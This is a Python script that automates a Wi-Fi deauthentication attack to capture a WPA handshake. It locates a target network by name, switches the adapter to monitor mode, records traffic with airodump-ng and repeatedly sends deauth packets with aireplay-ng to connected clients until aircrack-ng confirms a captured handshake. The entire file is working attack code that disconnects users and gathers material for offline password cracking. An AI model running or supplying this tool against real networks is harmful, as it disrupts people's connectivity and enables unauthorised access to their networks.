import argparse                         # parse flags
import os                               # check for directories, open processes
import subprocess                       # open processes
import time                             # sleep
from datetime import datetime as dt     # output time
from difflib import get_close_matches   # for network guesses
from termcolor import colored           # some colors for ya

# Parsing values ------------------ Start
parser = argparse.ArgumentParser(description='Automatically capture handshake')
parser.add_argument('ssid', metavar='NETWORK_NAME', help='Network name')
parser.add_argument('-i', metavar='INTERFACE', default='', help='Interface')
parser.add_argument('--conf', metavar='CONFIDENCE', type=float, default=0.6, help='Confidence in guessing network name from 0 to 1 (default = 0.6)')
parser.add_argument('--pack', metavar='PACKETS', type=int, default=10, help='Amount of packets to send (default = 10)')
parser.add_argument('--dir', metavar='DIRECTORY', default='', help='Directory, in which .cap file is stored (default = mydirectory/wifis/NETWORK_NAME/)')
parser.add_argument('--nokill', default=False, action='store_true', help='Specify if you dont want to kill processes. May not work depending upon your software/firmware')

args = parser.parse_args()
# Parsed values ------------------- End


# Global variables ------------------------- Start
Interface = args.i
Interfaces = []

SSID = args.ssid
BSSID = type(str)
Channel = type(int)
SignalStrength = type(int)

Confidence = args.conf  # How confident script must be in guessing network name

CurrentStation = ''
UsedStations = []
Stations = []
DeauthPacketsAmount = args.pack
CyclesAmount = 1	# If all stations found fail to deauth,
					# script will repeat deauth for all stations times CyclesAmount
					# (1 == Repeat 1 times, 0 = dont repeat, rescan)

MY_DIRECTORY = os.popen("pwd").read()
SaveTo = "{}/wifis/".format(MY_DIRECTORY[:-1])
if args.dir != '':
	SaveTo = args.dir

KillProcesses = not args.nokill
# Global variables ------------------------- End


# Custom functions ------------------------- Start
def select_interfaces():
	global Interfaces
	global Interface
	InterfaceIndex = type(int)

	del Interfaces[:]
	command_set_interface_up = "sudo iwconfig 2>&1 | grep -oP '^\w+'"
	interfaces = os.popen(command_set_interface_up).read().split("\n")[:-1]
	if len(interfaces) < 3:
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored("ERROR", 'red') + '] No interfaces')
		exit()
	index = 0
	for interface in interfaces:
		if interface != "lo" and interface != "eth0":
			os.popen("sudo ifconfig {} up".format(interface)).read()
			Interfaces.append(interface)
			index += 1
	if Interface in Interfaces and args.i != "":
		return True
	if Interface not in Interfaces and args.i != "":
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + "] No such interface {}".format(Interface))
		exit()

	if len(Interfaces) > 1:
		while Interface == "":
			print("Choose interface: ")
			i = 0
			chosen = ""
			for interface in Interfaces:
				print(interface + " ({})".format(i))
				i += 1
			InterfaceIndex = int(input())
			if len(Interfaces) > InterfaceIndex:
				Interface = Interfaces[InterfaceIndex]
				return True
			else:
				print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('WARNING', 'yellow') + '] You picked the wrong house fool')
	else:
		Interface = Interfaces[0]
		InterfaceIndex = 0
		return True
	return False


def get_name_by_phy(interface_phy_id):
	return os.popen("sudo airmon-ng | egrep {} |".format(interface_phy_id) + " awk '{print $2}'").read()[:-1]


def get_phy_by_name(interface_name):
	return os.popen("sudo airmon-ng | egrep {} |".format(Interface) + " awk '{print $1}'").read()[:-1]


def monitor_mode():
	command_get_mode = "sudo iwconfig {} | awk -F: '/Mode/{{print$2}}'".format(Interface)
	output_get_mode = os.popen(command_get_mode).read().split(" ", 1)[0]
	if output_get_mode == "Monitor":
		return True
	else:
		return False


def start_network_manager():
	if "Unit dhcpcd.service" in os.popen("sudo systemctl start dhcpcd 2>&1").read():
		os.popen("sudo systemctl start NetworkManager").read()


def start_airmon():
	global Interface
	if KillProcesses:
		output_airmon_check_kill = os.popen("sudo airmon-ng check kill").read()
	interface_phy = get_phy_by_name(Interface)
	output_airmon_start = os.popen("sudo airmon-ng start {}".format(Interface)).read()
	Interface = get_name_by_phy(interface_phy)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Changed interface: {}'.format(Interface))


def stop_airmon():
	global Interface
	interface_phy = get_phy_by_name(Interface)
	os.popen("sudo airmon-ng stop {}".format(Interface)).read()
	Interface = get_name_by_phy(interface_phy)
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Changed interface: {}'.format(Interface))


def get_network_info():
	global SSID
	global BSSID
	global Channel
	global SignalStrength
	command_scan_wifi = """sudo iwlist {} scan | egrep 'ESSID:|Address:|Channel:' | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' """.format(Interface)
	output_scan_wifi = os.popen(command_scan_wifi).read()
	splited_output_scan_wifi = output_scan_wifi.split("\n")
	if not splited_output_scan_wifi:
		time.sleep(5)
		output_scan_wifi = os.popen(command_scan_wifi).read()
		splited_output_scan_wifi = output_scan_wifi.split("\n")

	del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]

	if not splited_output_scan_wifi:
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] No networks found')
		exit()

	wifiNames = []

	index = 1
	for record in splited_output_scan_wifi:
		if record == SSID:
			BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(SSID)-2]
			Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(SSID)-1])
			return True

		elif index == 3:
			wifiNames.append(record)
			index = 0
		index += 1

	try:
		closeMatch = get_close_matches(SSID, wifiNames, 1, Confidence)[0]
		BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
		Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('WARNING', 'yellow') + "] No such network '{}', assuming you typed '{}'".format(SSID, closeMatch))
		SSID = closeMatch
	except IndexError:
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] Error scanning for network (network name is incorrect)')
		exit()


def start_airodump():
	command_airodump = "sudo airodump-ng --bssid '{}' -c '{}' --write-interval 1 --write '{}' {} > /dev/null 2>&1".format(BSSID, Channel, SaveTo, Interface)
	airodumpProcess = subprocess.Popen(command_airodump, shell=True)


def fill_stations():
	global Stations
	del Stations[:]
	with open('{}-01.csv'.format(SaveTo), 'r') as csvfile:
		for idx, val in enumerate(csvfile):
			if idx + 1 > 5:
				v = val.split(',')[0]
				if v != "\n" and v != "\r\n":
					Stations.append(val.split(',')[0])


def select_station():
	global CurrentStation
	global UsedStations
	if CurrentStation == "":
		CurrentStation = Stations[0]
	if UsedStations != Stations or len(UsedStations) != len(Stations):
		for CurrentStation in UsedStations:
			CurrentStation = Stations[Stations.index(CurrentStation)+1]
	else:
		del UsedStations[:]
		CurrentStation = Stations[0]
	UsedStations.append(CurrentStation)


def deauth():
	command_aireplay = "sudo aireplay-ng --ignore-negative-one --deauth {} -a {} -c {} {} > /dev/null 2>&1".format(DeauthPacketsAmount, BSSID, CurrentStation, Interface)
	deauthProcess = subprocess.Popen(command_aireplay, shell=True).wait()


def make_directory():
	global SaveTo
	SaveTo += "{}/".format(SSID)
	location = SaveTo
	if os.path.isdir(location):
		if len(os.listdir(location)) > 0:
			index = 1
			while os.path.isdir(location):
				if index >= 2:
					location = location[:-1]
				location = location[:-1]
				location += str(index) + "/"
				index += 1
			SaveTo = location
			os.makedirs(SaveTo)
		else:
			SaveTo = location
	else:
		SaveTo = location
		os.makedirs(SaveTo)
	return True


def check_handshake():
	command_aircrack_output = type(int)
	command_aircrack_output = ''
	try:
		command_aircrack = "sudo aircrack-ng {}-01.cap 2>&1 | sed -n '3p' | tr -s ' '".format(SaveTo)
		command_aircrack_output = os.popen(command_aircrack).read()
	except IndexError:
		command_aircrack = "sudo aircrack-ng {}-01.cap 2>&1 | sed -n '4p' | tr -s ' '".format(SaveTo)
		command_aircrack_output = os.popen(command_aircrack).read()
	if command_aircrack_output == "Invalid packet capture length 0 - corrupted file?\n":
		return False
	try:
		command_aircrack = "sudo aircrack-ng {}-01.cap | sed -n '7p' | tr -s ' ' | tr -d '()\n'".format(SaveTo)
		command_aircrack_output = int(os.popen(command_aircrack).read().split(" ")[5])
	except IndexError:
		command_aircrack = "sudo aircrack-ng {}-01.cap | sed -n '6p' | tr -s ' ' | tr -d '()\n'".format(SaveTo)
		command_aircrack_output = int(os.popen(command_aircrack).read().split(" ")[5])
	if command_aircrack_output > 0:
		return True
	else:
		return False


def check_for_stations():
	startTime = time.time()
	index = 1
	while True:
		if index != 1:
			# check output
			fill_stations()
			if len(Stations) > 0:
				select_station()
				print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Stations: {}'.format(Stations))
				break
		index += 1
		time.sleep(3.0 - ((time.time() - startTime) % 3.0))
# Custom functions ------------------------- End


# MAIN ---------------------------------- Start
if __name__ == "__main__":
	select_interfaces()
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Interface: {}'.format(Interface))
	if monitor_mode():
		stop_airmon()
		if KillProcesses:
			start_network_manager()
			time.sleep(5)
	get_network_info()
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] [SSID: {}] [BSSID: {}] [Channel: {}]'.format(SSID, BSSID, Channel))
	make_directory()
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Directory: {}'.format(SaveTo))
	start_airmon()
	start_airodump()
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Waiting for station...')
	time.sleep(1)
	check_for_stations()
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Sending {} deauth packets to {}'.format(DeauthPacketsAmount, CurrentStation))
	deauth()
	cyclesCount = 1
	while check_handshake() is False:
		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('WARNING', 'yellow') + '] Failure')
		if len(Stations) > 1 and cyclesCount < len(Stations)*(CyclesAmount+1):
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Selecting another station')
			select_station()
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Sending {} deauth packets to {}'.format(DeauthPacketsAmount, CurrentStation))
			deauth()
			cyclesCount += 1
		else:
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Rescanning stations...')
			check_for_stations()
			print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Sending {} deauth packets to {}'.format(DeauthPacketsAmount, CurrentStation))
			deauth()
			cyclesCount = 1
	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue', attrs=['bold']) + '] [' + colored('INFO', 'green', attrs=['bold']) + '] ' + colored('Success!', attrs=['bold']))
	stop_airmon()
	if KillProcesses:
		start_network_manager()
# MAIN ---------------------------------- END
